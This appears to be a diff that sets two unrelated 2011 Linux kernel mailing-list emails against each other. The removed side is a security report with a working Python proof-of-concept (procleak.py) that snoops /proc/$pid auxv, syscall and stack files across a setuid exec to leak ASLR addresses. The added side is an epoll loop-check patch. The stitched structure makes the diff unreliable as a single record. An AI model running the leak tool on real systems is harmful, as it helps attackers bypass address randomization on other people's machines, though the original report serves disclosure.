@@ -1,133 +1,192 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1755129Ab1BGXOS (ORCPT <rfc822;w@1wt.eu>);
-	Mon, 7 Feb 2011 18:14:18 -0500
-Received: from smtp.outflux.net ([198.145.64.163]:39281 "EHLO smtp.outflux.net"
-	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-	id S1755034Ab1BGXOR (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Mon, 7 Feb 2011 18:14:17 -0500
-Date: Mon, 7 Feb 2011 15:14:16 -0800
-From: Kees Cook <kees.cook@canonical.com>
-To: linux-kernel@vger.kernel.org
-Subject: [SECURITY] /proc/$pid/ leaks contents across setuid exec
-Message-ID: <20110207231416.GD1457@outflux.net>
+	id S1755234Ab1BGXPr (ORCPT <rfc822;w@1wt.eu>);
+	Mon, 7 Feb 2011 18:15:47 -0500
+Received: from mail-qy0-f174.google.com ([209.85.216.174]:40333 "EHLO
+	mail-qy0-f174.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1755060Ab1BGXPp (ORCPT
+	<rfc822;linux-kernel@vger.kernel.org>);
+	Mon, 7 Feb 2011 18:15:45 -0500
+DomainKey-Signature: a=rsa-sha1; c=nofws;
+        d=ksplice.com; s=google;
+        h=date:from:to:cc:subject:message-id:references:mime-version
+         :content-type:content-disposition:in-reply-to:user-agent;
+        b=eKFleJ7Iit+/19iHQT+F+MVyHJIzM7RYqF4M1fYoP2Xk8J9+4DkQ1VsE+m/GriTGbC
+         BGtAvfk7hETXwVouCCsauM6A8JVYwhEu16kKx8g3/kTq3VeWCd5iY+RwGIMPdYJtb4Q9
+         AF7hUZxJ6YxSHnfftmbmdiWWxQVs7fXV70/VE=
+Date: Mon, 7 Feb 2011 18:15:40 -0500
+From: Nelson Elhage <nelhage@ksplice.com>
+To: Davide Libenzi <davidel@xmailserver.org>
+Cc: linux-fsdevel@vger.kernel.org, Andrew Morton <akpm@linux-foundation.org>,
+        Linux Kernel Mailing List <linux-kernel@vger.kernel.org>,
+        security@kernel.org
+Subject: Re: [PATCH] epoll: Prevent deadlock through unsafe ->f_op->poll()
+ calls.
+Message-ID: <20110207231540.GL8040@ksplice.com>
+References: <1296954535-29495-1-git-send-email-nelhage@ksplice.com>
+ <alpine.DEB.2.00.1102051916170.22851@localhost6.localdomain6>
+ <alpine.DEB.2.00.1102061248420.3189@localhost6.localdomain6>
+ <20110206224508.GA13579@ksplice.com>
+ <alpine.DEB.2.00.1102061517370.3189@localhost6.localdomain6>
 MIME-Version: 1.0
 Content-Type: text/plain; charset=us-ascii
 Content-Disposition: inline
-Organization: Canonical
-X-HELO: www.outflux.net
+In-Reply-To: <alpine.DEB.2.00.1102061517370.3189@localhost6.localdomain6>
+User-Agent: Mutt/1.5.20 (2009-06-14)
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-Hi,
+The point of grabbing epmutex is to make sure that the loop-check and the insert
+happen atomically with respect to any other such pair of operations, so you need
+to hold epmutex across both the check and the insert. Something like the
+following. It's not particularly pretty, but it seems to work.
 
-This came to my attention via a post[1] to full-disclosure, but I don't
-think anyone actually brought it up to lkml. Local attackers are able to
-bypass DAC permissions in /proc/$pid/ when they can exec a setuid program.
-As long as the fd is open before the exec, its contents remain readable
-after the exec, even to a setuid program. Here is auxv being scanned for
-values that should be private, due to ASLR:
+I also had to change the "cookie" value in ep_loop_check_proc from 'ep' to
+'epi->ffd.file->private_data'; I think this is correct -- you want to avoid
+visiting the same _containing_ 'struct eventpoll' more than once. Without that
+fix, it doesn't detect the loop in my test case.
 
-$ ./procleak.py auxv /usr/bin/passwd
-AT_BASE:   0x7f761076f000
-AT_RANDOM: 0x7fff23697969
-Changing password for kees.
-(current) UNIX password: 
-
-Note that AT_RANDOM is the _location_ of AT_RANDOM, not the value itself,
-but this therefore leaks stack location, and AT_BASE leaks the mmap
-position of ld:
-
-7f761076f000-7f761078f000 r-xp 00000000 fc:00 1051386 /lib/ld-2.12.2.so
-...
-7fff23678000-7fff23699000 rw-p 00000000 00:00 0 [stack]
-
-Additionally, snooping on the kernel stack, the syscall parameters, and
-even changing oom_adj is possible. Luckily, maps, mem, etc are already
-protected by may_ptrace(). The attached tool can demonstrate the snooping,
-just specify which /proc/$pid files you want, and the setuid program to
-launch. For example:
-
-$ ./procleak.py auxv,syscall /usr/bin/passwd
-running
-AT_BASE:   0x7f2828bde000
-AT_RANDOM: 0x7fff80bde7c9
-Changing password for kees.
-(current) UNIX password: 0 0x0 0x7fff80bdda90 0x1ff 0x7fff80bdd580 0x7f2828dc57c0 0x7f28287cec1d 0x7fff80bdd088 0x7f28282fe6c0
-
-There needs to be some way to break the connection to these files across
-the setuid exec, or perform some sort of revalidation of permissions. (Maybe
-check dumpable?)
-
--Kees
-
-[1] http://seclists.org/fulldisclosure/2011/Jan/421
+This is minimally tested.
 
 ---
-#!/usr/bin/python
-# Demonstrates DAC bypass on /proc/$pid file descriptors across setuid exec.
-# Author: Kees Cook <kees@ubuntu.com>
-# License: GPLv2
-# Usage: ./procleak.py FILES,TO,SNOOP PROGRAM-TO-RUN
-import os, sys, time, struct
+ fs/eventpoll.c |   88 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ 1 files changed, 88 insertions(+), 0 deletions(-)
 
-target = os.getpid()
-snoop = ['auxv', 'syscall', 'stack']
+diff --git a/fs/eventpoll.c b/fs/eventpoll.c
+index cc8a9b7..8a05f33 100644
+--- a/fs/eventpoll.c
++++ b/fs/eventpoll.c
+@@ -224,6 +224,9 @@ static long max_user_watches __read_mostly;
+  */
+ static DEFINE_MUTEX(epmutex);
 
-args = []
-if len(sys.argv)>1:
-    args = sys.argv[1:]
-    snoop = args[0].split(',')
-    args = args[1:]
++/* Used to check for epoll file descriptor inclusion loops */
++static struct nested_calls poll_loop_ncalls;
++
+ /* Used for safe wake up implementation */
+ static struct nested_calls poll_safewake_ncalls;
 
-def dump_auxv(blob):
-    if len(blob) == 0:
-        return
-    auxv = struct.unpack('@%dL' % (len(blob)/len(struct.pack('@L',0))), blob)
-    while auxv[0] != 0:
-        if auxv[0] == 7:
-            print "AT_BASE:   0x%x" % (auxv[1])
-        if auxv[0] == 25:
-            print "AT_RANDOM: 0x%x" % (auxv[1])
-        auxv = auxv[2:]
+@@ -1188,6 +1191,62 @@ retry:
+ 	return res;
+ }
 
-pid = os.fork()
-if pid == 0:
-    # Child
-    os.setsid()
-    sys.stdin.close()
++/**
++ * ep_loop_check_proc - Callback function to be passed to the @ep_call_nested()
++ *                      API, to verify that adding an epoll file inside another
++ *                      epoll structure, does not violate the constraints, in
++ *                      terms of closed loops, or too deep chains (which can
++ *                      result in excessive stack usage).
++ *
++ * @priv: Pointer to the epoll file to be currently checked.
++ * @cookie: Original cookie for this call. This is the top-of-the-chain epoll
++ *          data structure pointer.
++ * @call_nests: Current dept of the @ep_call_nested() call stack.
++ *
++ * Returns: Returns zero if adding the epoll @file inside current epoll
++ *          structure @ep does not violate the constraints, or -1 otherwise.
++ */
++static int ep_loop_check_proc(void *priv, void *cookie, int call_nests)
++{
++	int error = 0;
++	struct file *file = priv;
++	struct eventpoll *ep = file->private_data;
++	struct rb_node *rbp;
++	struct epitem *epi;
++
++	mutex_lock(&ep->mtx);
++	for (rbp = rb_first(&ep->rbr); rbp; rbp = rb_next(rbp)) {
++		epi = rb_entry(rbp, struct epitem, rbn);
++		if (unlikely(is_file_epoll(epi->ffd.file))) {
++			error = ep_call_nested(&poll_loop_ncalls, EP_MAX_NESTS,
++					       ep_loop_check_proc, epi->ffd.file,
++					       epi->ffd.file->private_data, current);
++			if (error != 0)
++				break;
++		}
++	}
++	mutex_unlock(&ep->mtx);
++
++	return error;
++}
++
++/**
++ * ep_loop_check - Performs a check to verify that adding an epoll file (@file)
++ *                 another epoll file (represented by @ep) does not create
++ *                 closed loops or too deep chains.
++ *
++ * @ep: Pointer to the epoll private data structure.
++ * @file: Pointer to the epoll file to be checked.
++ *
++ * Returns: Returns zero if adding the epoll @file inside current epoll
++ *          structure @ep does not violate the constraints, or -1 otherwise.
++ */
++static int ep_loop_check(struct eventpoll *ep, struct file *file)
++{
++	return ep_call_nested(&poll_loop_ncalls, EP_MAX_NESTS,
++			      ep_loop_check_proc, file, ep, current);
++}
++
+ /*
+  * Open an eventpoll file descriptor.
+  */
+@@ -1236,6 +1295,7 @@ SYSCALL_DEFINE4(epoll_ctl, int, epfd, int, op, int, fd,
+ 		struct epoll_event __user *, event)
+ {
+ 	int error;
++	int did_lock_epmutex = 0;
+ 	struct file *file, *tfile;
+ 	struct eventpoll *ep;
+ 	struct epitem *epi;
+@@ -1277,6 +1337,25 @@ SYSCALL_DEFINE4(epoll_ctl, int, epfd, int, op, int, fd,
+ 	 */
+ 	ep = file->private_data;
 
-    files = dict()
-    last = dict()
-    for name in snoop:
-        files[name] = file('/proc/%d/%s' % (target, name))
-        # Ignore initial read, since it's from the existing parent
-        last[name] = files[name].read()
-    while True:
-        try:
-            for name in snoop:
-                files[name].seek(0)
-                saw = files[name].read()
-                if saw != last[name]:
-                    if name == 'auxv':
-                        dump_auxv(saw)
-                    else:
-                        print saw
-                    last[name] = saw
-        except Exception, o:
-            if o.errno == 3:
-                # Target quit
-                sys.exit(0)
++	/*
++	 * When we insert an epoll file descriptor, inside another epoll file
++	 * descriptor, there is the change of creating closed loops, which are
++	 * better be handled here, than in more critical paths.
++	 *
++	 * We hold epmutex across the loop check and the insert in this case, in
++	 * order to prevent two separate inserts from racing and each doing the
++	 * insert "at the same time" such that ep_loop_check passes on both
++	 * before either one does the insert, thereby creating a cycle.
++	 */
++	if (unlikely(is_file_epoll(tfile) && op == EPOLL_CTL_ADD)) {
++		mutex_lock(&epmutex);
++		did_lock_epmutex = 1;
++		error = -ELOOP;
++		if (ep_loop_check(ep, tfile) != 0)
++			goto error_tgt_fput;
++	}
++
++
+ 	mutex_lock(&ep->mtx);
 
-cmd = ['/usr/bin/passwd']
-if len(args) > 0:
-    cmd = args
-time.sleep(1)
-os.execv(cmd[0],cmd)
+ 	/*
+@@ -1312,6 +1391,9 @@ SYSCALL_DEFINE4(epoll_ctl, int, epfd, int, op, int, fd,
+ 	mutex_unlock(&ep->mtx);
 
+ error_tgt_fput:
++	if (did_lock_epmutex)
++		mutex_unlock(&epmutex);
++
+ 	fput(tfile);
+ error_fput:
+ 	fput(file);
+@@ -1431,6 +1513,12 @@ static int __init eventpoll_init(void)
+ 		EP_ITEM_COST;
+ 	BUG_ON(max_user_watches < 0);
 
++	/*
++	 * Initialize the structure used to perform epoll file descriptor
++	 * inclusion loops checks.
++	 */
++	ep_nested_calls_init(&poll_loop_ncalls);
++
+ 	/* Initialize the structure used to perform safe poll wait head wake ups */
+ 	ep_nested_calls_init(&poll_safewake_ncalls);
 
--- 
-Kees Cook
-Ubuntu Security Team
+--
+1.7.2.43.g68ef4
+
